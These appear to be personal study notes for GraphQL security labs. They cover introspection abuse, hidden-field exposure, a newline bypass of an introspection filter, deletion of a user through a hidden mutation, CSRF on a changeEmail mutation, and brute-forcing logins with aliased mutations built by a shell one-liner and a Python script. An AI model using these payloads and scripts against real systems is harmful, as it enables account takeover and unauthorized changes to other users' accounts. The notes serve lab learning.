```
Set Instrospection query to search for private Posts
-> Send to repeater the graphQL request of a blog post
-> change id in variables to the private one and add the method found on the instrospection


Generate queries with InQL scanner to find hidden fields, send to repeater and change variables, for example, id:!Int -> id:1 for admin


/api found
-> query not found: ?query=query{__typename}
-> Instrospection query, _schema not allowed, in raw append %0a to bypass
-> Right click, grpahQL, save graphQL queries to site map
-> In site map observer a deleteOrganizationUser query
-> Send to repeater and change id to 3 to delete carlos



Burte Force login endpoint bypassig blocks
-> Save Instrospection queries to site map
-> Send Login query from graphQL to repeater and then intruder
-> Notice you are blocked by many requests
-> Update the GrapQL query in repeater so the burte force is done in just one query:
mutation {
  bruteforce123456: login(input: {username:"carlos",password:"123456"}) {
     token
     success
    }
bruteforcepassword: login(input: {username:"carlos",password:"password"}) {
     token
     success
    }
bruteforce12345678: login(input: {username:"carlos",password:"12345678"}) {
     token
     success
    }
...
-> Use this oneliner to autoamte and paste:
for x in $(cat ../passwords.txt);do echo 'bruteforce'$x': login(input: {username:"carlos",password:"'$x'"}) {\n     token\n     success\n    }';done
-> search for status: success



Attempt a CSRF of changeEmail or similar
-> Change Content-Type to www-x-form-urlencoded
-> Change body to correct syntax:
query=mutation($input: ChangeEmailInput) {
				changeEmail(input: $input) {
				    email
				}
}
&variables={"input":{"email":"picha@test.com"}}
-> Generate CSRF PoC
```

1. Browse the target application, looking for requests to a GraphQL endpoint.
    GraphQL services often use similar endpoint suffixes. Look for queries to the following locations:
    - `/graphql`
    - `/api`
    - `/api/graphql`
    - `/graphql/api`
    - `/graphql/graphql`
    These endpoints may also contain a version number as a suffix, for example, `/graphql/v1`.
2. Right-click the GraphQL request, then select **Send to Repeater**.
3. In Repeater, right-click anywhere within the **Request** panel of the message editor, then select **GraphQL > Set introspection query** to insert an introspection query into the request body.
4. Click **Send**.
If introspection is enabled, the server should return the full schema of the GraphQL API in its response to your introspection query.

##### Find post
post id 3 does not exist,
use **GraphQL > Set introspection query** to find that theres a postPassword
go back to the query and add postPassword inside the getBlogPost, we see the pass in the response:
![[Pasted image 20240208225856.png]]

##### exposure of private fields
![[Pasted image 20240208230242.png]]
Use InQL scanner extension
![[Pasted image 20240208231418.png]]
right click and send to repeater
change id to 1 to access admin password


##### FInd Hiden endpoints
If you send a GET to /api you get query not found
Append:
`?query=query{__typename}`
Notice its reflected
If we send Set introspection query we get that schema is not allowed, go to raw and append a %0a next to `_schema`
Now we get return
- Go to **Target > Site map** to see the API queries. Use the **GraphQL** tab and find the `getUser` query. Right-click the request and select **Send to Repeater**.
    
- In Repeater, send the `getUser` query to the endpoint you discovered.
    
    Notice that the response returns:
    
    `{ "data": { "getUser": null } }`
- Click on the GraphQL tab and change the `id` variable to find `carlos`'s user ID. In this case, the relevant user ID is `3`.
- In **Target > Site map**, browse the schema again and find the `deleteOrganizationUser` mutation. Notice that this mutation takes a user ID as a parameter.
- Send the request to Repeater.
- In Repeater, send a `deleteOrganizationUser` mutation with a user ID of `3` to delete `carlos` and solve the lab.
    For example:
    `/api?query=mutation+%7B%0A%09deleteOrganizationUser%28input%3A%7Bid%3A+3%7D%29+%7B%0A%09%09user+%7B%0A%09%09%09id%0A%09%09%7D%0A%09%7D%0A%7D`


##### Brute Forcing login graphQL
![[Pasted image 20240209115753.png]]
Create a huge mutation request like:
```
mutation { 
bruteforce0:login(input:{password: "123456", username: "carlos"}) { token success } 
bruteforce1:login(input:{password: "password", username: "carlos"}) { token success } 
... 
bruteforce99:login(input:{password: "12345678", username: "carlos"}) { token success } }
```
![[Pasted image 20240209125739.png]]
for example craft it like:
```python
poc = """
bruteforce: login(input: { password: "peter", username: "carlos" }) {
        success
        token
    }
"""
poc = ['bruteforce',': login(','input: {password:','"peter"',',username:"carlos"}) {','\n    token','\n    success','\n  }']
passwords = """123456
password
12345678
qwerty
123456789
12345
1234
111111
1234567
dragon
123123
baseball
abc123
football
monkey
letmein
shadow
master
666666
qwertyuiop
123321
mustang
1234567890
michael
654321
superman
1qaz2wsx
7777777
121212
000000
qazwsx
123qwe
killer
trustno1
jordan
jennifer
zxcvbnm
asdfgh
hunter
buster
soccer
harley
batman
andrew
tigger
sunshine
iloveyou
2000
charlie
robert
thomas
hockey
ranger
daniel
starwars
klaster
112233
george
computer
michelle
jessica
pepper
1111
zxcvbn
555555
11111111
131313
freedom
777777
pass
maggie
159753
aaaaaa
ginger
princess
joshua
cheese
amanda
summer
love
ashley
nicole
chelsea
biteme
matthew
access
yankees
987654321
dallas
austin
thunder
taylor
matrix
mobilemail
mom
monitor
monitoring
montana
moon
moscow"""

change = ""
n=0
for i in passwords.split('\n'):
	for x in poc:
		if x=='bruteforce':
			x+=str(n)
		elif x=='"peter"':
			x='"'+str(i)+'"'
		elif x=='\n  }':
			x+='\n'
		change+=x
	n+=1
print(change)
```



##### CSRF using change email in graphQL
given:
```
{"query":"\n    mutation changeEmail($input: ChangeEmailInput!) {\n        changeEmail(input: $input) {\n            email\n        }\n    }\n","operationName":"changeEmail","variables":{"input":{"email":"caca@caca.com"}}}
```
Change the request query to:
```
Content-Type: www-x-form-urlencoded

query=
mutation changeEmail($input: ChangeEmailInput!) {
        changeEmail(input: $input) {
					email 
				}
}
&operationname="changeEmail"&variables={"input": {"email":"cacoso@gmail.com"}}
```
